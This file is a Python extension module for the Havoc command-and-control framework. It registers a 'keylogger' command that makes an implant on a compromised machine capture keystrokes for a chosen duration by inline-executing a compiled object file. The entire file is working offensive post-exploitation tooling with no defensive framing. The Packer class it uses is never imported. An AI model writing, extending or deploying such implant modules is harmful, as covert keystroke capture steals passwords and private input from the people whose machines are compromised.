from havoc import Demon, RegisterCommand, RegisterModule

def keylogger_start( demonID, *params ):
    TaskID : str    = None
    demon  : Demon  = None
    packer = Packer()

    demon  = Demon( demonID )

    num_params = len(params)
    duration = 10

    if num_params > 0:
        try:
            duration = int(params[0])
        except ValueError:
            demon.ConsoleWrite( demon.CONSOLE_ERROR, "Invalid duration. Usage: keylogger [seconds]" )
            return False

    if duration < 1 or duration > 300:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Duration must be between 1 and 300 seconds" )
        return False

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to capture keystrokes for {duration} seconds..." )

    packer.addint( duration )
    demon.InlineExecute( TaskID, "go", "bin/keylogger.x64.o", packer.getbuffer(), False )

    return TaskID

RegisterCommand( keylogger_start, "", "keylogger", "Capture keystrokes for a specified duration (default 10s)", 0, "[seconds]", "15" )
